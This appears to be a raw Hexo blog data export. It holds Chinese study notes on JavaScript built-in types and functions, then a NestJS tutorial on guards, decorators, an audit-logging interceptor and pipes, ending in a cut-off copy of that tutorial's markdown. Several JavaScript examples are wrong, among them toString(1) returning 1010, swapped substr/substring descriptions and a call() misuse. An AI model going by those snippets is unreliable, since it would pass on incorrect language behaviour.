—接受一个字符串参数，在该模式下匹配成功返回true，否则返回false(只要存在即返回true)<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var text = &apos;cat, bat, sat, fat&apos;</span><br><span class=\"line\">var pattern = /.at/;</span><br><span class=\"line\">var matches = pattern.exec(text)    </span><br><span class=\"line\">matches[0]      //cat</span><br><span class=\"line\">matches.index   // 0</span><br><span class=\"line\">var text = &quot;456000-00-000123&quot;</span><br><span class=\"line\">var pattern = /\\d&#123;3&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;/</span><br><span class=\"line\">pattern.test(text)      // true</span><br></pre></td></tr></table></figure><p></p><h4 id=\"Function类型\"><a href=\"#Function类型\" class=\"headerlink\" title=\"Function类型\"></a>Function类型</h4><p>每个函数都是Function类型的实例，而且都有与其他引用类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数的指针，不会与某个函数绑定。<br>既然函数名是一个指针，所以JavaScript没有重载。<br><strong>ps：访问函数指针时，应该不加圆括号</strong></p><h5 id=\"函数表达式和函数声明\"><a href=\"#函数表达式和函数声明\" class=\"headerlink\" title=\"函数表达式和函数声明\"></a>函数表达式和函数声明</h5><p>由于JavaScript中有函数声明解析器，在所有函数执行前，会将函数声明提升至顶端。因此，函数表达式和函数声明会有一些区别<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum1(10,11)     //21</span><br><span class=\"line\">function sum1(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">sum2(10,12) //Uncaught TypeError: sum2 is not a function</span><br><span class=\"line\">var sum2 = function (num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>其他无明显差别</p><h5 id=\"callee-caller\"><a href=\"#callee-caller\" class=\"headerlink\" title=\"callee caller\"></a>callee caller</h5><p>callee被调用者<br>caller调用者<br>mdn不建议使用</p><h5 id=\"函数的属性和方法\"><a href=\"#函数的属性和方法\" class=\"headerlink\" title=\"函数的属性和方法\"></a>函数的属性和方法</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function F1(a,b)&#123;</span><br><span class=\"line\">    //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function F2()&#123;</span><br><span class=\"line\">    //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">F1.length // 2</span><br><span class=\"line\">F2.length // 0</span><br></pre></td></tr></table></figure><p>函数的length属性代表参数的个数</p><h5 id=\"call与apply\"><a href=\"#call与apply\" class=\"headerlink\" title=\"call与apply\"></a>call与apply</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function sum(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function callSum(num1, num2)&#123;</span><br><span class=\"line\">    return sum.call(this,num1,num2)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">callSum(10,10)  //20</span><br><span class=\"line\">function sum(num1,num2)&#123;</span><br><span class=\"line\">    return num1+num2</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function callSum(num1, num2)&#123;</span><br><span class=\"line\">    return sum.call(this,arguments)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">callSum(10,10)  //20</span><br></pre></td></tr></table></figure><p>call和apply是两个非继承而来的方法，apply接受两个参数，一个是运行时函数的作用域，另一个是arguments对象或array实例；而call方法第一个参数是运行时函数作用域，其他参数是传入字面量。必须逐个列举出来<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.color = &apos;red&apos;</span><br><span class=\"line\">var o = &#123;</span><br><span class=\"line\">    color:&apos;green&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function sayCOlor()&#123;</span><br><span class=\"line\">    console.log(this.color)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">sayCOlor.call(this)     //red</span><br><span class=\"line\">sayCOlor.call(window)   //red</span><br><span class=\"line\">sayCOlor.call(o)        //green</span><br></pre></td></tr></table></figure><p></p><p>call,apply的最大好处是让其扩充作用域，且实现松耦合</p><p>bind是创建一个实例，其this值会被绑定到传给bind函数的值<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.color = &apos;red&apos;</span><br><span class=\"line\">var o = &#123;</span><br><span class=\"line\">    color : &apos;blue&apos;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function sayColor()&#123;</span><br><span class=\"line\">    console.log(this.color)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var objectSayColor = sayColor.bind(o)</span><br><span class=\"line\">objectSayColor()    //blue</span><br></pre></td></tr></table></figure><p></p><h4 id=\"基本包装类型\"><a href=\"#基本包装类型\" class=\"headerlink\" title=\"基本包装类型\"></a>基本包装类型</h4><h5 id=\"Boolean类型\"><a href=\"#Boolean类型\" class=\"headerlink\" title=\"Boolean类型\"></a>Boolean类型</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var falseObject = new Boolean(false)</span><br><span class=\"line\">var result = falseObject  &amp;&amp; true</span><br><span class=\"line\">result // true</span><br><span class=\"line\">var falseValue = false</span><br><span class=\"line\">result = falseValue &amp;&amp; true</span><br><span class=\"line\">result // false</span><br><span class=\"line\">typeof falseObject  // object</span><br><span class=\"line\">typeof falseValue   // boolean</span><br><span class=\"line\">falseObject instanceof Boolean  //true</span><br><span class=\"line\">falseValue instanceof Boolean   //false</span><br></pre></td></tr></table></figure><p>基本类型布尔值与Boolean对象有一定差别，书上建议永远不要使用Boolean对象</p><h5 id=\"Number类型\"><a href=\"#Number类型\" class=\"headerlink\" title=\"Number类型\"></a>Number类型</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var numberObject = new Number(10)</span><br><span class=\"line\">numberObject    // Number &#123;[[PrimitiveValue]]: 10&#125;</span><br><span class=\"line\">numberObject.toString() // &quot;10&quot;</span><br><span class=\"line\">numberObject.valueOf()  // 10</span><br></pre></td></tr></table></figure><p>Number类型重写了valueOf(),toLocaleString(),toString()，重写后，valueOf返回基本类型值<br>基本类型的几个方法</p><p>1、toFixed // 有一个参数，代表保留几位小数<br>2、toExponential // 指数表示法，表示制定输出结果中小数位数<br>3、toPrecision // 接受一个参数，合理的调用toFixed和toExponential<br>4、toString // 接受一个参数，代表转换成几进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 10</span><br><span class=\"line\">num.toString()  //10</span><br><span class=\"line\">num.toString(1)  //1010</span><br><span class=\"line\">num.toFixed(2)  //10.00</span><br><span class=\"line\">num.toExponential(1)  //1.0e+1</span><br><span class=\"line\">var nums = 99</span><br><span class=\"line\">num.toPrecision(1)  //1e+2</span><br><span class=\"line\">num.toPrecision(2)  // 99</span><br><span class=\"line\">num.toPrecision(3)  // 99.0</span><br></pre></td></tr></table></figure><p></p><h5 id=\"String类型\"><a href=\"#String类型\" class=\"headerlink\" title=\"String类型\"></a>String类型</h5><p>1、字符方法<br>charAt —以单个字符串的形式返回给定位置的字符<br>charCodeAt —以单个字符串的形式返回给定位置的字符编码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var stringValue = &apos;hello world&apos;</span><br><span class=\"line\">stringValue.charAt(1)       // e</span><br><span class=\"line\">stringValue.charCodeAt(1)   // 101</span><br></pre></td></tr></table></figure><p></p><p>2、字符串方法<br>slice —接受两个参数，第一个是指定位置，第二个位结束位置，为负数从后往前切取<br>substr —接受两个参数，第一个是指定位置，第二个是结束位置，为负数从0往后开始<br>substring —接受两个参数，第一个是指定位置，第二个是字符个数，为负数从后往前切取<br>3、字符串位置<br>indexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从0开始往后<br>lastIndexOf —接受两个参数，第一个是寻找字符，第二个是指定位置，默认从后开始往前<br>4、trim<br>将字符串前后空格去除<br>5、大小写转换方法<br>toLowerCase //转换为小写<br>toUpperCase //转换为大写<br>toLocaleLowerCase<br>toLocaleUpperCase<br>6、replace<br>采用两个参数，第一个是匹配的正则表达式，第二个是替换内容<br>7、localeCompare方法<br>比较两个字符串，返回1,0，-1<br>8、fromCharCode方法<br>接受多个参数，将ASCII码转换成对应的字符</p><h5 id=\"单体内置对象\"><a href=\"#单体内置对象\" class=\"headerlink\" title=\"单体内置对象\"></a>单体内置对象</h5><p>1、Global对象<br>URI编码方法<br>(1)encodeURI，将空格转换成%20<br>(2)encodeURIComponent,将所有非字符转换成对应编码<br>(3)decodeURI，将encodeURI转换的uri反编码<br>(4)decodeURIComponent，将encodeURIComponent转换的uri反编码<br>2、eval方法<br>只接受一个参数，将字符串解析成JavaScript代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&apos;console.log(123)&apos;)  // 123</span><br></pre></td></tr></table></figure><p></p><h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过本章学习，有许多细致的方法以前没有使用过的现在很多都理解了。还有数组的存储，以前只是一个黑匣子对于我而言。现在能够认清它的本质，能对以后的代码优化有更好的帮助。</p>"},{"title":"NestJs 入门教程之四：高阶用法","date":"2021-09-15T13:19:29.000Z","dir":"nestJs","keywords":"NestJs 教程","_content":"![nestjs](nestjs.png)\n\n{% post_link nest-js-tutorial-3 上篇 %}文章，实现了 `数据库` 基础操作 和联表查询。\n\n本篇是教程的最终篇，虽然我们实现了 NestJs 的基础功能，但是真正的服务器需要做全局的数据核查、敏感操作落库和数据转化。\n\n拥有这些能力才能让后台能力更加丰富，本篇将主要使用 NestJs 的高级能力，来实现这些功能。\n\n本篇概要：\n- 使用 `guards` 和 `decorators` 实现数据校验核查\n- 通过 `interceptors` 和 `decorators` 实现敏感操作录入\n- 自定义 `pipes` 实现数据转化\n<!-- 这里不能删除，不然展示不完整 -->\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n# 守卫 Guards\n![guards](guards.png)\n在 `请求到达业务逻辑前` 会经过 guard，这样在接口前可以做统一处理。\n\n例如：检查登陆态、检查权限 ...\n\n需要在业务逻辑前 `统一检查`\b 的信息，都可以抽象成守卫。\n\n在真实场景中，大多数的后台管理端会用 `JWT` 实现接口鉴权。`NestJs` 也提供了对应的[解决方案](https://docs.nestjs.com/security/authentication)。\n\n由于较长且原理相通，本篇暂时用校验 `user` 字段做演示。\n\n## 新建守卫\n\n新建 `user.guard.ts` 文件\n\n```ts\n// src/common/guards/user.guard.ts\nimport { Injectable, CanActivate, ExecutionContext, UnauthorizedException } from '@nestjs/common';\nimport { Observable } from 'rxjs';\n\n@Injectable()\nexport class UserGuard implements CanActivate {\n  canActivate(\n    context: ExecutionContext,\n  ): boolean | Promise<boolean> | Observable<boolean> {\n    const request = context.switchToHttp().getRequest();\n    const user = request.body.user;\n\n    if (user) {\n        return true;\n    }\n\n    throw new UnauthorizedException('need user field');\n  }\n}\n```\n\n## 单个接口使用守卫\n\n单个接口使用需要用 `@UseGuards` 作为引用。再将定义的 `UserGuard` 作为入参。\n\n\b在 `student.controller.ts` 中使用\n```ts\nimport {  UseGuards  /** ... **/} from '@nestjs/common';\nimport { UserGuard } from '../common/guards/user.guard';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n\n    @UseGuards(UserGuard)\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n    // ...\n}\n\n```\n\n这样当访问 `who-are-you` 和 `who-is-request` 就起作用了\n```bash\n// ❌ 不使用 user\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => {\"statusCode\":401,\"message\":\"need user to distinct\",\"error\":\"Unauthorized\"}%  \n\n// ✅ 使用 user\n// curl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\", \"name\": \"gdccwxx\"}'\n// => Im student gdccwxx%\n```\n\n## 全局使用\n\n全局使用仅需在 `app.module.ts` 的 `providers` 中引入。这样就对全局生效了\n```ts\nimport { APP_GUARD } from '@nestjs/core';\nimport { UserGuard } from './common/guards/user.guard';\n// ...\n\n@Module({\n  controllers: [AppController],\n  providers: [\n    {\n      provide: APP_GUARD,\n      useClass: UserGuard,\n    },\n      AppService\n  ],\n  // ...\n})\nexport class AppModule {}\n\n```\n\n这时再访问 `get` 请求 `who-are-you` 和 `post` 请求 `who-is-request`\n```bash\n// ❌ get who-are-you\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => {\n// statusCode: 401,\n// message: \"need user field\",\n// error: \"Unauthorized\"\n// }\n\n// ✅ post \ncurl -X POST http://127.0.0.1:3000/students/who-is-request -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => gdccwxx%\n```\n\n## 自定义装饰器过滤\n总有些接口我们不需要有 `user` 字段，这时自定义 `decorator` 就出马了。\n\n基本原理是：在接口前设置 MetaData, 在服务启动时把 MetaData 写入内存，这样在请求过来时判断有无 MetaData 标签。有则通过，无则校验。\n\n顺便也将 `get` 请求类型过滤掉。\n\n```ts\n// common/decorators.ts\nexport const NoUser = () => SetMetadata('no-user', true);\n```\n\n`user.guard.ts` 改造\n\n```ts\n// user.guard.ts\nimport { Reflector } from '@nestjs/core';\n// ..\n\n@Injectable()\nexport class UserGuard implements CanActivate {\n  constructor(private reflector: Reflector) {}\n\n  canActivate(\n    context: ExecutionContext,\n  ): boolean | Promise<boolean> | Observable<boolean> {\n    const request = context.switchToHttp().getRequest();\n    const user = request.body.user;\n\n    if (request.method !== 'POST') {\n        return true;\n    }\n\n    const noCheck = this.reflector.get<string[]>('no-user', context.getHandler());\n\n    if (noCheck) {\n        return true;\n    }\n\n    if (user) {\n        return true;\n    }\n\n    throw new UnauthorizedException('need user field');\n  }\n}\n```\n\n`NoUser` 使用\n```ts\n// students.controller.ts\nimport { User, NoUser } from '../common/decorators';\n// ..\n\n@Controller('students')\nexport class StudentsController {\n    // ...\n    @NoUser()\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n}\n\n```\n\n再调用时，就不会再校验了。\n\n```bash\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => Im student gdccwxx%\n```\n\n这样就实现了全局守卫，但是部分接口不需要守卫的情况。\n\n特别适用于登录态的校验，只有登陆接口不需要登录态，其他接口都需要登陆态或鉴权。\n\n# 拦截器 Interceptors\n![interceptors](interceptors.png)\n\n拦截器工作在 `请求前` 和 `响应后`。它的原理和 `decorator` 类似，不同的是能做全局级别。\n\n它的应用场景也非常广，例如：接口请求参数和请求结果的数据保存、设计模式中的 adapter 模式 等...\n\n我们来用它实现敏感信息的数据保存。\n\n它的原理和 `guards` 类似, 通过 `decorator` 加载到内存，知道哪些接口需要敏感操作记录，然后在调用接口时将 入参和结果存入。\n\n涉及到数据库操作，因此需要新增模块和数据库连接。\n\n## 新建敏感权限模块\n新建敏感权限模块，包括 controller、module 和 service\n```bash\nnest g controller sensitive\nnest g module sensitive\nnest g service sensitive\n```\n\n## 创建 entity 文件\n新建 `sensitive.entity.ts` 。\n\n这里会用到 `transformer`, 原因是 `mysql` 底层并没有 `Object` 类型。需要通过 JS 把它存成 `string` 格式，在读取时用 `object` 格式。这样代码就不需要感知是啥类型了。\n\n```ts\nimport { Entity, Column, PrimaryGeneratedColumn, CreateDateColumn } from 'typeorm';\nimport { SensitiveType } from '../constants';\n\n// to 写入数据库\n// from 从数据库读取\nconst dataTransform = {\n    to: (value: any) => JSON.stringify(value || {}),\n    from: (value: any) => JSON.parse(value)\n}\n\n@Entity()\nexport class Sensitive {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'enum', enum: SensitiveType })\n  type: string;\n\n  @Column({ type: 'varchar' })\n  pathname: string;\n\n  @Column({ type: 'text', transformer: dataTransform })\n  parameters: any;\n\n  @Column({ type: 'text', transformer: dataTransform })\n  results: any;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n## 引用数据库\n和之前介绍数据库一样，在 `sensitive.module.ts` 中引入数据库\n```ts\nimport { Module } from '@nestjs/common';\nimport { SensitiveController } from './sensitive.controller';\nimport { SensitiveService } from './sensitive.service';\nimport { Sensitive } from './entities/sensitive.entity';\nimport { TypeOrmModule } from '@nestjs/typeorm';\n\n@Module({\n  controllers: [SensitiveController],\n  imports: [TypeOrmModule.forFeature([Sensitive])],\n  providers: [Sensitive, SensitiveService],\n  exports: [SensitiveService],\n})\nexport class SensitiveModule {}\n```\n\n## service 核心逻辑\n\n敏感操作比较简单，service 仅需实现新增和查询。\n\n先定义敏感操作类型\n```ts\n// src/sensitive/constants.ts\nexport enum SensitiveType {\n    Modify = 'Modify',\n    Set = 'Set',\n    Create = 'Create',\n    Delete = 'Delete',\n}\n```\n\n在修改 service，引入db操作\n\n```ts\n// src/sensitive/sensitive.service.ts\nimport { Injectable } from '@nestjs/common';\nimport { Sensitive } from './entities/sensitive.entity';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { SensitiveType } from './constants';\n\n@Injectable()\nexport class SensitiveService {\n    constructor(\n        @InjectRepository(Sensitive)\n        private readonly sensitiveRepository: Repository<Sensitive>,\n    ) {}\n\n    async setSensitive(type: SensitiveType, pathname: string, parameters: any, results: any) {\n        return await this.sensitiveRepository.save({\n            type,\n            pathname,\n            parameters,\n            results,\n        }).catch(e => e);\n    }\n\n    async getSensitive(type: SensitiveType) {\n        return await this.sensitiveRepository.find({ \n            where: {\n                type,\n            }\n        });\n    }\n}\n```\n\n## controller 修改\ncontroller 比较简单，只需要简单的查询即可。敏感信息写入则是通过 decorator + interceptor 来实现\n\n```ts\n// src/sensitive/sensitive.controller.ts\nimport { Controller, Get, Query } from '@nestjs/common';\nimport { SensitiveService } from './sensitive.service';\nimport { SensitiveType } from './constants';\n\n@Controller('sensitive')\nexport class SensitiveController {\n    constructor(private readonly sensitiveService: SensitiveService) {}\n\n    @Get('/get-by-type')\n    getSensitive(@Query('type') type: SensitiveType) {\n        return this.sensitiveService.getSensitive(type);\n    }\n}\n```\n## 新增装饰器\n装饰器的用场来了，只需要告诉某个接口需要敏感操作记录，并指定类型即可。\n\n```ts\n// src/common/decorators\nimport { SetMetadata } from '@nestjs/common';\nimport { SensitiveType } from '../sensitive/constants';\n\nexport const SensitiveOperation = (type: SensitiveType) => SetMetadata('sensitive-operation', type);\n// ...\n```\n\n通过传参的方式，定义敏感操作的类型。在数据库中可以分类，通过索引的方式查找修改入参和结果。\n\n## 拦截器\n重点来了！！\n\n和守卫权限校验类似，通过 `reflector` 取出内存中的 sensitive-operation 类型。\n\n新建 `src/common/interceptors/sensitive.interceptor.ts`\n\n```ts\n// src/common/interceptors/sensitive.interceptor.ts\nimport { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';\nimport { Reflector } from '@nestjs/core';\nimport { SensitiveService } from '../../sensitive/sensitive.service';\nimport { SensitiveType } from '../../sensitive/constants';\nimport { Observable } from 'rxjs';\nimport { tap } from 'rxjs/operators';\n\n@Injectable()\nexport class SensitiveInterceptor implements NestInterceptor {\n  constructor(private reflector: Reflector, private sensitiveService: SensitiveService) {}\n\n  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {\n    const request = context.switchToHttp().getRequest();\n\n    const type = this.reflector.get<SensitiveType | undefined>('sensitive-operation', context.getHandler());\n\n    if (!type) {\n        return  next.handle();\n    }\n\n    return next\n      .handle()\n      .pipe(\n        tap((data) => this.sensitiveService.setSensitive(type, request.url, request.body, data)),\n      );\n  }\n}\n\n```\n\n并在 app.module.ts 中引入全局。\n```ts\n// app.module.ts\nimport { APP_GUARD, APP_INTERCEPTOR } from '@nestjs/core';\nimport { SensitiveInterceptor } from './common/interceptors/sensitive.interceptor';\n// ...\n\n@Module({\n  providers: [\n    {\n      provide: APP_INTERCEPTOR,\n      useClass: SensitiveInterceptor,\n    },\n    // ...\n  ],\n  // ...\n})\nexport class AppModule { }\n\n```\n\n## 其他模块引用\nstudent 模块引入\n```ts\n// src/students/students.controller.ts\nimport { SensitiveOperation } from '../common/decorators';\nimport { SensitiveType } from '../sensitive/constants';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n\n    @SensitiveOperation(SensitiveType.Set)\n    @Post('set-student-name')\n    setStudentName(@User() user: string) {\n        return this.studentsService.setStudent(user);\n    }\n    // ...\n}\n\n```\n\n仅需要在接口前引入 `@SensitiveOperation(SensitiveType.Set)` 即可！是不是非常优美。\n\n再来调用下！\n```bash\n// ✅ 使用命令行调用\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx1\"}'\n// => {\"name\":\"gdccwxx1\",\"id\":3,\"updateDate\":\"2021-09-17T05:48:41.685Z\",\"createDate\":\"2021-09-17T05:48:41.685Z\"}%\n\n// ✅ 打开浏览器\nhttp://localhost:3000/sensitive/get-by-type?type=set\n// => [{\n//  id: 1,\n//  type: \"Set\",\n//  pathname: \"/students/set-student-name\",\n//  parameters: { user: \"gdccwxx1\" },\n//  results: { name: \"gdccwxx1\", id: 3, updateDate: \"2021-09-17T05:48:41.685Z\", createDate: \"2021-09-17T05:48:41.685Z\" },\n//  createDate: \"2021-09-17T05:48:41.719Z\"\n// }]\n```\n\nbingo！这样就达到了我们想要的目的！\n\n在不影响原有业务逻辑的情况下，仅是在接口处做标识的简单调用。实现了 `AOP` 的调用方式。对老代码的改造和新业务的编写都十分有用。\n\n\n# 管道 Pipes\n![pipes](pipes.png)\nNestJs `Pipes` 的概念和 linux `shell` 的概念非常相似，都是通过前者的输出再做一些事情。\n\n它的应用场景也非常广，例如：数据转化，数据校验等...\n\n对数据输入时的操作非常有用。对复杂数据校验，例如表单数据等十分有用。\n\n我们没有复杂输入，我们来使用简单的数据转化，实现在名字前加上🇨🇳\n\n## 新建 Pipes\n新建 `src/common/pipes/name.pipes.ts`。\n```ts\n// src/common/pipes/name.pipes.ts\nimport { PipeTransform, Injectable, ArgumentMetadata } from '@nestjs/common';\n\n@Injectable()\nexport class TransformNamePipe implements PipeTransform {\n  transform(name: string, metadata: ArgumentMetadata) {\n    return `🇨🇳 ${name.trim()}`;\n  }\n}\n\n```\n\n和其他 NestJs 一样，都需要重载一边内置对象。`Pipes` 也需要重载 `PipeTransform`。\n\n## 使用管道\n在 `controller` 中使用 `pipes`。\n\n```ts\nimport { TransformNamePipe } from '../common/pipes/name.pipes';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    @Get('who-are-you')\n    whoAreYou(@Query('name', TransformNamePipe) name: string) {\n        return this.studentsService.ImStudent(name);\n    }\n    // ...\n}\n\n```\nquery 的第二个参数是 pipes, 也可以使用多个 pipes 对数据连续处理\n\n## 调用接口\n再浏览器访问\n```bash\n// ✅\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => Im student 🇨🇳 gdccwxx\n```\n\n这样就实现了简单版本的数据转换了！\n\n\n# 总结\n至此，NestJs 的入门篇章就结束了。\n\n简单回顾下教程内容：\n- 通过 `nest cli` 新建工程、新建模块\n- 通过 `@Get` 和 `@Post` 实现 get、post 请求\n- 通过 `dto` 限制对参数进行限制\n- 自定义 `decorator` 实现参数获取、设置 `metadata`\n- 调用内置 `log` 实现日志规范化\n- 使用 `typeorm` 对数据库连接和基础操作，并进行联表操作及查询\n- 使用 `guard` 对参数进行校验（可扩展成登录态）\n- 使用 `interceptor` 实现敏感数据落地\n- 使用 `pipes` 实现数据格式化\n\n笔者也在 NestJs 逐渐探索中。它不仅包括简单的数据服务，还支持 `GraphQL`、`SSE`、`Microservice` 等等，是综合性非常强的框架。\n\nbtw：这是笔者用这么久以来最喜欢的 Node 框架了\n\n感谢你的阅读～","source":"_posts/nest-js-tutorial-4.md","raw":"---\ntitle: NestJs 入门教程之四：高阶用法\ndate: 2021-09-15 21:19:29\ntags:\n    - javascript\n    - typescript\n    - nestJs\ndir: nestJs\nkeywords: NestJs 教程\n---\n![nestjs](nestjs.png)\n\n{% post_link nest-js-tutorial-3 上篇 %}文章，实现了 `数据库` 基础操作 和联表查询。\n\n本篇是教程的最终篇，虽然我们实现了 NestJs 的基础功能，但是真正的服务器需要做全局的数据核查、敏感操作落库和数据转化。\n\n拥有这些能力才能让后台能力更加丰富，本篇将主要使用 NestJs 的高级能力，来实现这些功能。\n\n本篇概要：\n- 使用 `guards` 和 `decorators` 实现数据校验核查\n- 通过 `interceptors` 和 `decorators` 实现敏感操作录入\n- 自定义 `pipes` 实现数据转化\n<!-- 这里不能删除，不然展示不完整 -->\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n# 守卫 Guards\n![guards](guards.png)\n在 `请求到达业务逻辑前` 会经过 guard，这样在接口前可以做统一处理。\n\n例如：检查登陆态、检查权限 ...\n\n需要在业务逻辑前 `统一检查`\b 的信息，都可以抽象成守卫。\n\n在真实场景中，大多数的后台管理端会用 `JWT` 实现接口鉴权。`NestJs` 也提供了对应的[解决方案](https://docs.nestjs.com/security/authentication)。\n\n由于较长且原理相通，本篇暂时用校验 `user` 字段做演示。\n\n## 新建守卫\n\n新建 `user.guard.ts` 文件\n\n```ts\n// src/common/guards/user.guard.ts\nimport { Injectable, CanActivate, ExecutionContext, UnauthorizedException } from '@nestjs/common';\nimport { Observable } from 'rxjs';\n\n@Injectable()\nexport class UserGuard implements CanActivate {\n  canActivate(\n    context: ExecutionContext,\n  ): boolean | Promise<boolean> | Observable<boolean> {\n    const request = context.switchToHttp().getRequest();\n    const user = request.body.user;\n\n    if (user) {\n        return true;\n    }\n\n    throw new UnauthorizedException('need user field');\n  }\n}\n```\n\n## 单个接口使用守卫\n\n单个接口使用需要用 `@UseGuards` 作为引用。再将定义的 `UserGuard` 作为入参。\n\n\b在 `student.controller.ts` 中使用\n```ts\nimport {  UseGuards  /** ... **/} from '@nestjs/common';\nimport { UserGuard } from '../common/guards/user.guard';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n\n    @UseGuards(UserGuard)\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n    // ...\n}\n\n```\n\n这样当访问 `who-are-you` 和 `who-is-request` 就起作用了\n```bash\n// ❌ 不使用 user\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => 